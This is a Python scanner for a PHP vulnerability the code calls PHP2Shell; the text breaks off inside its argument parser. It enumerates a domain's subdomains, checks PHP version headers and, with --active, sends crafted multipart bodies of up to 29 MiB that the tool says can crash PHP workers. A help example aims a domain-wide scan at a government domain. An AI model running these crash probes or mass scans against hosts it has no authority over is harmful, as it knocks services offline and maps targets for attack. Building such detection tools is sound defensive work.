#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "h11>=0.14.0",
#     "tqdm>=4.64.0",
# ]
# ///
"""
php2shell-scan — All-in-one PHP2Shell exposure scanner.

Pipeline: domain → subdomain enum → DNS resolution → version check → report.

Safe by default: only reads X-Powered-By headers (no crash probes sent).
Pass --active to also send crash-inducing probes (not recommended on production).

CVE-2026-109618 / CVE-2026-109619 (php2shell)
Discovery credit: Calif team — https://calif.io/php2shell/
Scanning logic adapted from: assetnote/php2shell-scanner
"""

import argparse
import asyncio
import concurrent.futures
import json
import re
import socket
import ssl
import sys
import time
import urllib.request
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from functools import lru_cache
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import SplitResult, quote, urlsplit, urlunsplit

try:
    import h11
except ImportError:
    print("Error: 'h11' library required. Install with: pip install h11")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    print("Error: 'tqdm' library required. Install with: pip install tqdm")
    sys.exit(1)


# ── Constants ──────────────────────────────────────────────────────────────────

VERSION = "1.0.0"
TOOL_NAME = "php2shell-scan"
CVES = "CVE-2026-109618 / CVE-2026-109619"

DEFAULT_PATH = "/index.php"
PHPMYADMIN_PATH = "/show_config_errors.php"
PHPMYADMIN_MARKER = b"phpMyAdmin"
CONTROL_BOUNDARY = "x"
PROBE_BOUNDARY = ""
CONTROL_BODY = b"--x\nContent-Disposition:name=a;filename=\n\n"
NESTED_KEYS = 62
BODY_READ_LIMIT = 1 << 20
CONNECT_TIMEOUT = 10
MAX_RESPONSE_HEADER_BYTES = 10 << 20
UPLOAD_CHUNK_SIZE = 64 << 10
READ_BUFFER_HIGH_WATER = 256 << 10
READ_BUFFER_LOW_WATER = 64 << 10
WRITE_BUFFER_HIGH_WATER = 256 << 10
WRITE_BUFFER_LOW_WATER = 64 << 10
DNS_TIMEOUT = 3
ENUM_TIMEOUT = 20

DEFAULT_USER_AGENT = (
    f"Mozilla/5.0 (compatible; {TOOL_NAME}/{VERSION}; "
    "+https://github.com/hangchain443/php2shell-scan)"
)
ENUM_USER_AGENT = f"{TOOL_NAME}/{VERSION}"

PROBES = ((1, 4000), (8, 1020), (20, 1020))
REJECTED_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}

# Minimum patched patch version per (major, minor) branch.
FIXED_VERSIONS: Dict[Tuple[int, int], int] = {
    (8, 2): 35,
    (8, 3): 36,
    (8, 4): 27,
    (8, 5): 12,
}

VERSION_PATTERN = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
HEADER_NAME_PATTERN = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$")
SENSITIVE_HEADERS = {"authorization", "cookie", "proxy-authorization", "set-cookie", "x-api-key"}


# ── Terminal colors ────────────────────────────────────────────────────────────

class Colors:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def print_banner() -> None:
    print(
        f"\n{Colors.CYAN}{Colors.BOLD}"
        f"  {TOOL_NAME} v{VERSION}  —  {CVES}"
        f"{Colors.RESET}\n"
    )


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


# ── Subdomain enumeration ──────────────────────────────────────────────────────

def _fetch_url(url: str, timeout: int = ENUM_TIMEOUT) -> Optional[str]:
    """Fetch a URL and return the response body as text, or None on error."""
    req = urllib.request.Request(url, headers={"User-Agent": ENUM_USER_AGENT})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except Exception:
        return None


def enum_crtsh(domain: str) -> Set[str]:
    """Certificate transparency via crt.sh (HTML scrape — JSON endpoint rate-limits)."""
    url = f"https://crt.sh/?q=%.{domain}"
    body = _fetch_url(url)
    if not body:
        return set()
    found = set()
    for m in re.finditer(r"[a-zA-Z0-9\-\.]+\." + re.escape(domain), body):
        host = m.group(0).lower().lstrip("*.")
        if host.endswith("." + domain) or host == domain:
            found.add(host)
    return found


def enum_hackertarget(domain: str) -> Set[str]:
    """Passive DNS via HackerTarget's free API."""
    url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
    body = _fetch_url(url)
    if not body or body.startswith("error"):
        return set()
    found = set()
    for line in body.splitlines():
        parts = line.split(",", 1)
        if parts:
            host = parts[0].strip().lower()
            if host.endswith("." + domain) or host == domain:
                found.add(host)
    return found


def enumerate_subdomains(domain: str, quiet: bool = False) -> List[str]:
    """Run all passive enum sources in parallel and return a deduplicated list."""
    sources = [
        ("crt.sh",       enum_crtsh),
        ("HackerTarget", enum_hackertarget),
    ]
    results: Set[str] = set()
    with ThreadPoolExecutor(max_workers=len(sources)) as ex:
        futures = {ex.submit(fn, domain): name for name, fn in sources}
        for fut in as_completed(futures):
            name = futures[fut]
            try:
                found = fut.result()
                results.update(found)
                if not quiet:
                    print(colorize(f"  [{name}] {len(found)} hosts", Colors.CYAN))
            except Exception as exc:
                if not quiet:
                    print(colorize(f"  [{name}] error: {exc}", Colors.YELLOW))
    return sorted(results)


# ── DNS resolution ─────────────────────────────────────────────────────────────

def resolve_host(hostname: str) -> bool:
    """Return True if the hostname resolves to at least one address."""
    try:
        socket.setdefaulttimeout(DNS_TIMEOUT)
        socket.getaddrinfo(hostname, None)
        return True
    except Exception:
        return False


def resolve_live(hostnames: List[str], threads: int = 50) -> List[str]:
    """Filter hostnames to those that resolve in DNS."""
    live: List[str] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for host, ok in zip(hostnames, ex.map(resolve_host, hostnames)):
            if ok:
                live.append(host)
    return sorted(live)


def hosts_to_urls(hosts: List[str]) -> List[str]:
    return [f"https://{h}" for h in hosts]


# ── HTTP layer (adapted from assetnote/php2shell-scanner) ──────────────────────

@dataclass
class HTTPResult:
    status_code: Optional[int] = None
    reason: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    bytes_sent: int = 0
    error: Optional[str] = None

    @property
    def powered_by(self) -> str:
        for name, value in self.headers.items():
            if name.lower() == "x-powered-by":
                return value
        return ""


class HTTPTransportError(Exception):
    pass


@dataclass
class ConnectionEnd:
    error: Optional[Exception]


class DuplexHTTPProtocol(asyncio.Protocol):
    def __init__(self) -> None:
        self.transport: Optional[asyncio.Transport] = None
        self.incoming: asyncio.Queue = asyncio.Queue()
        self.writable = asyncio.Event()
        self.writable.set()
        self.buffered_bytes = 0
        self.reading_paused = False
        self.ended = False
        self.end_error: Optional[Exception] = None

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        self.transport = transport  # type: ignore[assignment]
        transport.set_write_buffer_limits(high=WRITE_BUFFER_HIGH_WATER, low=WRITE_BUFFER_LOW_WATER)  # type: ignore[attr-defined]

    def data_received(self, data: bytes) -> None:
        if not data:
            return
        self.buffered_bytes += len(data)
        self.incoming.put_nowait(data)
        if self.buffered_bytes >= READ_BUFFER_HIGH_WATER and not self.reading_paused and self.transport:
            self.transport.pause_reading()  # type: ignore[attr-defined]
            self.reading_paused = True

    def eof_received(self) -> Optional[bool]:
        self._finish(None)
        return False

    def connection_lost(self, exc: Optional[Exception]) -> None:
        self._finish(exc)

    def pause_writing(self) -> None:
        self.writable.clear()

    def resume_writing(self) -> None:
        self.writable.set()

    def _finish(self, error: Optional[Exception]) -> None:
        if self.ended:
            return
        self.ended = True
        self.end_error = error
        self.writable.set()
        self.incoming.put_nowait(ConnectionEnd(error))

    async def write(self, data: bytes) -> None:
        await self.writable.wait()
        if self.ended or self.transport is None:
            raise self.end_error or BrokenPipeError("connection closed while uploading")
        self.transport.write(data)  # type: ignore[attr-defined]
        await asyncio.sleep(0)

    async def read(self) -> bytes:
        item = await self.incoming.get()
        if isinstance(item, ConnectionEnd):
            if item.error:
                raise item.error
            return b""
        self.buffered_bytes -= len(item)
        if (
            self.reading_paused
            and self.buffered_bytes <= READ_BUFFER_LOW_WATER
            and self.transport
            and not self.ended
        ):
            self.transport.resume_reading()  # type: ignore[attr-defined]
            self.reading_paused = False
        return item

    def abort(self) -> None:
        if self.transport:
            self.transport.abort()


def _header_value(headers: Dict[str, str], name: str) -> str:
    for k, v in headers.items():
        if k.lower() == name.lower():
            return v
    return ""


def _remove_header(headers: Dict[str, str], name: str) -> None:
    for k in list(headers):
        if k.lower() == name.lower():
            del headers[k]


def _response_headers(raw: List[Tuple[bytes, bytes]]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    seen: Dict[str, str] = {}
    for rn, rv in raw:
        name = rn.decode("ascii")
        value = rv.decode("latin-1")
        low = name.lower()
        if low in seen:
            out[seen[low]] += ", " + value
        else:
            seen[low] = name
            out[name] = value
    return out


def _request_target(parsed: SplitResult) -> bytes:
    path = quote(parsed.path or "/", safe="/%:@!$&'()*+,;=-._~")
    if parsed.query:
        path += "?" + quote(parsed.query, safe="/?%:@!$&'()*+,;=-._~")
    return path.encode("ascii")


def _host_header(parsed: SplitResult) -> str:
    hostname = parsed.hostname
    if not hostname:
        raise ValueError("URL has no hostname")
    hostname = hostname.encode("idna").decode("ascii")
    if ":" in hostname:
        hostname = f"[{hostname}]"
    if parsed.port:
        hostname += f":{parsed.port}"
    return hostname


def _build_request_headers(custom: Dict[str, str], boundary: str) -> Dict[str, str]:
    headers = dict(custom)
    for name in ("Content-Length", "Transfer-Encoding"):
        _remove_header(headers, name)
    if not any(k.lower() == "user-agent" for k in headers):
        headers["User-Agent"] = DEFAULT_USER_AGENT
    # remove and re-add to normalise casing
    _remove_header(headers, "Content-Type")
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    _remove_header(headers, "Connection")
    headers["Connection"] = "close"
    if not any(k.lower() == "accept-encoding" for k in headers):
        headers["Accept-Encoding"] = "gzip"
    return headers


def _wire_headers(parsed: SplitResult, headers: Dict[str, str], body_size: int) -> List[Tuple[bytes, bytes]]:
    host = _header_value(headers, "Host") or _host_header(parsed)
    out: List[Tuple[bytes, bytes]] = [(b"Host", host.encode("latin-1"))]
    for name, value in headers.items():
        if name.lower() == "host":
            continue
        out.append((name.encode("ascii"), value.encode("latin-1")))
    out.append((b"Content-Length", str(body_size).encode("ascii")))
    return out


async def _upload_body(conn: h11.Connection, proto: DuplexHTTPProtocol, body: bytes) -> None:
    for offset in range(0, len(body), UPLOAD_CHUNK_SIZE):
        data = conn.send(h11.Data(data=body[offset: offset + UPLOAD_CHUNK_SIZE]))
        if data:
            await proto.write(data)
    data = conn.send(h11.EndOfMessage())
    if data:
        await proto.write(data)


async def _decode_gzip(decoder, data: bytes, body: bytearray):
    pending = data
    if decoder.eof and pending:
        decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)
    while pending:
        try:
            decoded = decoder.decompress(pending, UPLOAD_CHUNK_SIZE)
        except zlib.error as exc:
            raise HTTPTransportError(f"invalid gzip: {exc}") from exc
        remaining = BODY_READ_LIMIT - len(body)
        if remaining > 0:
            body.extend(decoded[:remaining])
        if decoder.eof:
            pending = decoder.unused_data
            if pending:
                decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)
        else:
            pending = decoder.unconsumed_tail
        if pending:
            await asyncio.sleep(0)
    return decoder


async def _read_response(conn: h11.Connection, proto: DuplexHTTPProtocol) -> HTTPResult:
    status_code = None
    reason = ""
    headers: Dict[str, str] = {}
    body = bytearray()
    decoder = None

    while True:
        event = conn.next_event()
        if event is h11.NEED_DATA:
            data = await proto.read()
            conn.receive_data(data)
            continue
        if event is h11.PAUSED:
            raise HTTPTransportError("unexpected additional HTTP response")
        if isinstance(event, h11.InformationalResponse):
            if event.status_code == 101:
                raise HTTPTransportError("protocol upgrade not supported")
            continue
        if isinstance(event, h11.Response):
            status_code = event.status_code
            reason = event.reason.decode("latin-1")
            headers = _response_headers(list(event.headers))
            enc = _header_value(headers, "Content-Encoding").strip().lower()
            if enc == "gzip":
                decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)
                _remove_header(headers, "Content-Encoding")
                _remove_header(headers, "Content-Length")
            elif enc not in ("", "identity"):
                raise HTTPTransportError(f"unsupported encoding: {enc}")
            continue
        if isinstance(event, h11.Data):
            if decoder:
                decoder = await _decode_gzip(decoder, event.data, body)
            else:
                remaining = BODY_READ_LIMIT - len(body)
                if remaining > 0:
                    body.extend(event.data[:remaining])
            continue
        if isinstance(event, h11.EndOfMessage):
            if status_code is None:
                raise HTTPTransportError("response ended before headers")
            if decoder:
                try:
                    tail = decoder.flush()
                except zlib.error as exc:
                    raise HTTPTransportError(f"invalid gzip: {exc}") from exc
                remaining = BODY_READ_LIMIT - len(body)
                body.extend(tail[:remaining])
            return HTTPResult(status_code, reason, headers, bytes(body))
        if isinstance(event, h11.ConnectionClosed):
            raise HTTPTransportError("connection closed before response")


async def _exchange(target_url: str, body: bytes, headers: Dict[str, str], timeout: int, verify_ssl: bool) -> HTTPResult:
    parsed = urlsplit(target_url)
    hostname = parsed.hostname
    if not hostname:
        raise ValueError("URL has no hostname")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    ssl_ctx = None
    open_kw: Dict = {}
    if parsed.scheme == "https":
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.set_alpn_protocols(["http/1.1"])
        if not verify_ssl:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
        open_kw = {"ssl": ssl_ctx, "server_hostname": hostname, "ssl_handshake_timeout": min(CONNECT_TIMEOUT, timeout)}

    loop = asyncio.get_running_loop()
    transport, proto_base = await asyncio.wait_for(
        loop.create_connection(DuplexHTTPProtocol, host=hostname, port=port, happy_eyeballs_delay=0.25, **open_kw),
        timeout=min(CONNECT_TIMEOUT, timeout),
    )
    proto = proto_base
    if not isinstance(proto, DuplexHTTPProtocol):
        transport.abort()
        raise HTTPTransportError("transport init failed")
    upload_task = None
    try:
        conn = h11.Connection(h11.CLIENT, max_incomplete_event_size=MAX_RESPONSE_HEADER_BYTES)
        req = h11.Request(method=b"POST", target=_request_target(parsed), headers=_wire_headers(parsed, headers, len(body)))
        data = conn.send(req)
        if data:
            await proto.write(data)
        upload_task = asyncio.create_task(_upload_body(conn, proto, body))
        return await _read_response(conn, proto)
    finally:
        if upload_task and not upload_task.done():
            upload_task.cancel()
            await asyncio.gather(upload_task, return_exceptions=True)
        proto.abort()


def _send_post(target_url: str, body: bytes, boundary: str, custom_headers: Dict[str, str], timeout: int, verify_ssl: bool) -> HTTPResult:
    result = HTTPResult(bytes_sent=len(body))
    headers = _build_request_headers(custom_headers, boundary)
    try:
        response = asyncio.run(asyncio.wait_for(_exchange(target_url, body, headers, timeout, verify_ssl), timeout=timeout))
        result.status_code = response.status_code
        result.reason = response.reason
        result.headers = response.headers
        result.body = response.body
    except ssl.SSLError as exc:
        result.error = f"SSL error: {exc}"
    except asyncio.TimeoutError:
        result.error = "request timed out"
    except h11.RemoteProtocolError as exc:
        result.error = f"response read failed: {exc}"
    except (h11.LocalProtocolError, ValueError, UnicodeError) as exc:
        result.error = f"request failed: {exc}"
    except (OSError, HTTPTransportError) as exc:
        result.error = f"connection error: {exc}"
    return result


# ── Probe body builder ─────────────────────────────────────────────────────────

@lru_cache(maxsize=len(PROBES))
def _build_probe_body(size_mib: int, parts: int) -> bytes:
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError(f"probe of {size} bytes cannot hold {parts} parts")
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


# ── Vulnerability detection ────────────────────────────────────────────────────

def _redact_response(result: HTTPResult) -> str:
    """Build a short human-readable response snippet, redacting sensitive headers."""
    if result.error:
        return f"request failed after {result.bytes_sent} bytes: {result.error}"
    lines = [f"HTTP/1.1 {result.status_code} {result.reason}"]
    for name, value in result.headers.items():
        if name.lower() in SENSITIVE_HEADERS:
            lines.append(f"{name}: <redacted>")
        else:
            lines.append(f"{name}: {value}")
    return "\r\n".join(lines)


def _version_verdict(powered_by: str) -> Optional[str]:
    """Return 'VULNERABLE', 'FIXED', or None based on the PHP version string."""
    match = VERSION_PATTERN.search(powered_by)
    if not match:
        return None
    major, minor, patch = (int(v) for v in match.groups())
    fixed = FIXED_VERSIONS.get((major, minor))
    if fixed is None:
        return None
    return "FIXED" if patch >= fixed else "VULNERABLE"


def _crash_signal(control: HTTPResult, probe: HTTPResult, sapi: str) -> Tuple[Optional[str], Optional[str]]:
    if b"Allowed memory size of " in probe.body and b" bytes exhausted" in probe.body and b"Unknown" in probe.body:
        mode = "PHP-FPM" if sapi == "fpm" else "mod_php" if sapi == "mod_php" else "mod_php/PHP-FPM"
        return mode, "in-band PHP fatal error (memory exhausted in Unknown)"

    if probe.status_code == 500 and control.body and not probe.body:
        mode = "PHP-FPM" if sapi == "fpm" else "mod_php" if sapi == "mod_php" else "mod_php/PHP-FPM"
        return mode, "HTTP 500 with empty body (control had output)"

    if sapi == "mod_php":
        return None, None

    if probe.status_code in (502, 503, 504):
        return "PHP-FPM", f"HTTP {probe.status_code} — worker died mid-request"
    if probe.status_code == 200 and control.body and not probe.body:
        return "PHP-FPM", "HTTP 200 with empty body — worker died mid-request"
    return None, None


def _base_result(host: str) -> dict:
    return {
        "host":        host,
        "tested_url":  None,
        "final_url":   None,
        "vulnerable":  None,
        "verdict":     "ERROR",
        "sapi":        None,
        "powered_by":  None,
        "reason":      None,
        "error":       None,
        "status_code": None,
        "response":    None,
        "control":     None,
        "probes":      [],
        "scanned_at":  utc_now(),
    }


def _apply_response(result: dict, r: HTTPResult) -> None:
    if r.status_code is not None:
        result["status_code"] = r.status_code
    if r.error is None and r.status_code is not None:
        result["response"] = _redact_response(r)


def _scan_url(host: str, target_url: str, timeout: int, verify_ssl: bool, custom_headers: Dict[str, str], sapi: str, active: bool) -> dict:
    result = _base_result(host)
    result["tested_url"] = target_url
    result["final_url"] = target_url

    # Control request — tiny multipart body, just enough to elicit a response.
    control = _send_post(target_url, CONTROL_BODY, CONTROL_BOUNDARY, custom_headers, timeout, verify_ssl)
    _apply_response(result, control)

    if control.error:
        result["error"] = f"control request failed: {control.error}"
        result["reason"] = result["error"]
        return result
    if control.status_code is not None and control.status_code >= 500:
        result["verdict"] = "INCONCLUSIVE"
        result["error"] = f"control request returned HTTP {control.status_code}"
        result["reason"] = result["error"]
        return result

    if PHPMYADMIN_MARKER in control.body:
        target_url = _phpmyadmin_url(target_url)
        result["final_url"] = target_url
        control = _send_post(target_url, CONTROL_BODY, CONTROL_BOUNDARY, custom_headers, timeout, verify_ssl)
        _apply_response(result, control)
        if control.error or (control.status_code is not None and control.status_code >= 500):
            result["verdict"] = "INCONCLUSIVE"
            result["error"] = f"phpMyAdmin control failed: {control.error or control.status_code}"
            result["reason"] = result["error"]
            return result

    powered_by = control.powered_by

    # ── Version-only path (safe default) ──────────────────────────────────────
    if not active:
        by_version = _version_verdict(powered_by)
        result["powered_by"] = powered_by or None
        if by_version == "VULNERABLE":
            result["vulnerable"] = True
            result["verdict"] = "VULNERABLE"
            result["sapi"] = "unknown" if sapi == "auto" else ("PHP-FPM" if sapi == "fpm" else "mod_php")
            result["reason"] = f"X-Powered-By reports an unpatched release: {powered_by}"
        elif by_version == "FIXED":
            result["vulnerable"] = False
            result["verdict"] = "FIXED"
            result["reason"] = f"X-Powered-By reports a patched release: {powered_by}"
        else:
            result["vulnerable"] = False
            result["verdict"] = "NO SIGNAL"
            result["reason"] = "no PHP version header advertised; no probes sent (use --active to probe)"
        return result

    # ── Active path — crash probes ─────────────────────────────────────────────
    rejected = False
    rejected_reason = None

    for idx, (size_mib, parts) in enumerate(PROBES, start=1):
        body = _build_probe_body(size_mib, parts)
        probe = _send_post(target_url, body, PROBE_BOUNDARY, custom_headers, timeout, verify_ssl)
        probe_meta = {"probe": idx, "size_mib": size_mib, "parts": parts, "status": probe.status_code, "error": probe.error}
        result["probes"].append(probe_meta)
        _apply_response(result, probe)

        if probe.powered_by:
            powered_by = probe.powered_by
        result["powered_by"] = powered_by or None

        if probe.error:
            result["verdict"] = "INCONCLUSIVE"
            result["error"] = f"probe {idx} failed: {probe.error}"
            result["reason"] = result["error"]
            return result

        if probe.status_code in REJECTED_STATUSES:
            rejected = True
            rejected_reason = f"probe {idx} rejected with HTTP {probe.status_code}"
            break

        detected_sapi, signal = _crash_signal(control, probe, sapi)
        if signal:
            result["vulnerable"] = True
            result["verdict"] = "VULNERABLE"
            result["sapi"] = detected_sapi
            result["reason"] = f"probe {idx} ({size_mib} MiB) crashed the handler: {signal}"
            return result

        if _version_verdict(powered_by) == "FIXED":
            result["vulnerable"] = False
            result["verdict"] = "FIXED"
            result["reason"] = f"no crash; X-Powered-By reports a patched release: {powered_by}"
            return result

    by_version = _version_verdict(powered_by)
    result["powered_by"] = powered_by or None
    if by_version == "VULNERABLE":
        result["vulnerable"] = True
        result["verdict"] = "VULNERABLE"
        result["sapi"] = "unknown" if sapi == "auto" else ("PHP-FPM" if sapi == "fpm" else "mod_php")
        result["reason"] = f"no crash observed; X-Powered-By reports unpatched: {powered_by}"
    elif by_version == "FIXED":
        result["vulnerable"] = False
        result["verdict"] = "FIXED"
        result["reason"] = f"no crash; patched version: {powered_by}"
    elif rejected:
        result["verdict"] = "INCONCLUSIVE"
        result["error"] = rejected_reason
        result["reason"] = rejected_reason
    else:
        result["vulnerable"] = False
        result["verdict"] = "NO SIGNAL"
        result["reason"] = "no crash and no PHP version advertised"
    return result


def _phpmyadmin_url(target_url: str) -> str:
    parsed = urlsplit(target_url)
    return urlunsplit((parsed.scheme, parsed.netloc, PHPMYADMIN_PATH, "", ""))


def _normalize_url(raw: str) -> str:
    raw = raw.strip()
    if not raw:
        raise ValueError("empty URL")
    if "://" not in raw:
        raw = "https://" + raw
    parsed = urlsplit(raw)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError(f"invalid URL: {raw!r}")
    path = parsed.path if (parsed.path and parsed.path != "/") else DEFAULT_PATH
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def scan_host(host: str, timeout: int, verify_ssl: bool, custom_headers: Dict[str, str], sapi: str, active: bool, paths: Optional[List[str]] = None) -> dict:
    try:
        normalized = _normalize_url(host)
    except ValueError as exc:
        r = _base_result(host)
        r["error"] = str(exc)
        r["reason"] = str(exc)
        return r

    targets = [normalized.replace(_normalize_url(host).split("://", 1)[1].split("/", 1)[-1] if "/" in _normalize_url(host) else DEFAULT_PATH[1:], p.lstrip("/")) for p in paths] if paths else [normalized]

    # Build target list properly
    if paths:
        base_parsed = urlsplit(normalized)
        targets = [urlunsplit((base_parsed.scheme, base_parsed.netloc, p if p.startswith("/") else "/" + p, "", "")) for p in paths]
    else:
        targets = [normalized]

    fallback: Optional[dict] = None
    priority = {"NO SIGNAL": 0, "FIXED": 1, "INCONCLUSIVE": 2, "ERROR": 2}

    for target_url in targets:
        try:
            result = _scan_url(normalized, target_url, timeout, verify_ssl, custom_headers, sapi, active)
        except Exception as exc:
            result = _base_result(normalized)
            result["error"] = f"unexpected error: {exc}"
            result["reason"] = result["error"]

        if result.get("vulnerable") is True:
            return result
        if fallback is None or priority.get(result["verdict"], 0) > priority.get(fallback["verdict"], 0):
            fallback = result

    return fallback or _base_result(normalized)


# ── Output ─────────────────────────────────────────────────────────────────────

def _parse_headers(header_list: Optional[List[str]]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for h in header_list or []:
        if ":" not in h:
            raise ValueError(f"invalid header {h!r}; expected 'Key: Value'")
        key, value = h.split(":", 1)
        key = key.strip()
        if not HEADER_NAME_PATTERN.fullmatch(key):
            raise ValueError(f"invalid header name {key!r}")
        out[key] = value.lstrip()
    return out


def _print_result(result: dict, verbose: bool = False, quiet: bool = False) -> None:
    verdict = result["verdict"]
    if result["vulnerable"] is True:
        status = colorize("[VULNERABLE]", Colors.RED + Colors.BOLD)
    elif verdict == "FIXED":
        status = colorize("[FIXED]",         Colors.GREEN)
    elif result["vulnerable"] is False:
        status = colorize("[NOT VULNERABLE]", Colors.GREEN)
    elif verdict == "INCONCLUSIVE":
        status = colorize("[INCONCLUSIVE]",   Colors.YELLOW)
    else:
        status = colorize("[ERROR]",          Colors.YELLOW)

    if quiet and result["vulnerable"] is not True:
        return

    details = []
    if result.get("status_code") is not None:
        details.append(f"Status: {result['status_code']}")
    if result.get("sapi"):
        details.append(f"SAPI: {result['sapi']}")
    if result.get("powered_by"):
        details.append(f"PHP: {result['powered_by']}")
    if verdict:
        details.append(f"Verdict: {verdict}")
    suffix = " - " + " - ".join(details) if details else ""
    host = result.get("final_url") or result.get("tested_url") or result["host"]
    print(f"{status} {colorize(host, Colors.WHITE)}{suffix}")

    if verbose and result.get("reason"):
        print(f"  -> {result['reason']}")
    if verbose and result.get("response"):
        print(colorize("  Response snippet:", Colors.CYAN))
        for line in result["response"].split("\r\n")[:10]:
            print(f"    {line}")


def _print_summary(results: List[dict], active: bool) -> None:
    vuln   = sum(1 for r in results if r.get("vulnerable") is True)
    fixed  = sum(1 for r in results if r.get("verdict") == "FIXED")
    nosig  = sum(1 for r in results if r.get("verdict") == "NO SIGNAL")
    incon  = sum(1 for r in results if r.get("verdict") in ("INCONCLUSIVE", "ERROR"))
    total  = len(results)

    print()
    print(colorize("=" * 60, Colors.CYAN))
    print(colorize("SCAN SUMMARY", Colors.BOLD))
    print(colorize("=" * 60, Colors.CYAN))
    print(f"  Total hosts scanned:   {total}")
    print(colorize(f"  Vulnerable:            {vuln}", Colors.RED + Colors.BOLD) if vuln else f"  Vulnerable:            {vuln}")
    print(f"  Fixed/patched:         {fixed}")
    print(f"  No signal:             {nosig}")
    print(f"  Inconclusive/errors:   {incon}")
    if not active and nosig > 0:
        print()
        print(colorize(
            f"  [!] {nosig} hosts suppressed their PHP version header.\n"
            "      Re-run with --active to probe them (caution on production).",
            Colors.YELLOW
        ))
    print(colorize("=" * 60, Colors.CYAN))


def _save_results(results: List[dict], path: str, all_results: bool) -> None:
    selected = results if all_results else [r for r in results if r.get("vulnerable") is True]
    output = {
        "tool":          TOOL_NAME,
        "version":       VERSION,
        "scanned_at":    utc_now(),
        "total_results": len(selected),
        "results":       selected,
    }
    try:
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(output, fh, indent=2)
        print(colorize(f"\n[+] Results saved to: {path}", Colors.GREEN))
    except OSError as exc:
        print(colorize(f"\n[ERROR] Failed to save results: {exc}", Colors.RED))


def _load_lines(path: str, label: str) -> List[str]:
    try:
        with open(path, encoding="utf-8") as fh:
            return [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    except OSError as exc:
        print(colorize(f"[ERROR] Cannot read {label} file: {exc}", Colors.RED))
        sys.exit(1)


def _deduplicate(urls: List[str]) -> List[str]:
    seen: Set[str] = set()
    out: List[str] = []
    for url in urls:
        try:
            key = _normalize_url(url)
        except ValueError:
            key = url
        if key not in seen:
            seen.add(key)
            out.append(url)
    return out


# ── CLI ────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description=f"{TOOL_NAME} — All-in-one PHP2Shell ({CVES}) exposure scanner.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Passive scan of a whole domain (no crash probes):
    %(prog)s -d gov.ls

  Scan with pre-built URL list and save JSON results:
    %(prog)s -l hosts.txt -o results.json

  Active crash-probe scan (use with caution on production):
    %(prog)s -d example.com --active

  Scan a single URL quietly, only print vulnerable:
    %(prog)s -u https://example.com -q

  Custom headers + specific PHP paths:
    %(prog)s -d example.com -H "Cookie: session=abc" --path /admin.php

Safe by default: only the X-Powered-By header is read.
Use --active to send crash-inducing probes (29 MiB per host).
""",
    )

    # Input — mutually exclusive
    inp = parser.add_mutually_exclusive_group(required=True)
    inp.add_argument("-d", "--domain",  help="Target domain; subdomains are enumerated automatically (e.g. gov.ls)")
    inp.add_argument("-u", "--url",     help="Single URL/host to scan")
    inp.add_argument("-l", "--list",    help="File containing URLs or hostnames, one per line")

    # Scan behaviour
    parser.add_argument("--active", action="store_true",
                        help="Send crash-inducing probes in addition to the version check. "
                             "Probes reach 29 MiB and can kill PHP workers on production hosts.")
    parser.add_argument("--sapi", choices=("auto", "mod_php", "fpm"), default="auto",
                        help="Restrict active-probe verdict rules to a known SAPI (default: auto)")
    parser.add_argument("--path", action="append", dest="paths",
                        help="Additional path to test on each host; repeatable (e.g. --path /admin.php)")
    parser.add_argument("--path-file", help="File of paths to test, one per line")

    # Network
    parser.add_argument("-t", "--threads", type=int, default=20,
                        help="Concurrent scan threads (default: 20)")
    parser.add_argument("--dns-threads", type=int, default=50,
                        help="Concurrent DNS resolution threads during domain enum (default: 50)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="Per-request timeout in seconds (default: 30)")
    parser.add_argument("-k", "--insecure", action="store_true",
                        help="Disable TLS certificate verification")
    parser.add_argument("-H", "--header", action="append", dest="headers", metavar="HEADER",
                        help="Custom request header in 'Key: Value' format; repeatable")

    # Output
    parser.add_argument("-o", "--output", help="Save results to a JSON file")
    parser.add_argument("--all-results", action="store_true",
                        help="Include all hosts in the JSON output, not only vulnerable ones")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Print verdict reasons and response snippets")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Only print vulnerable hosts")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
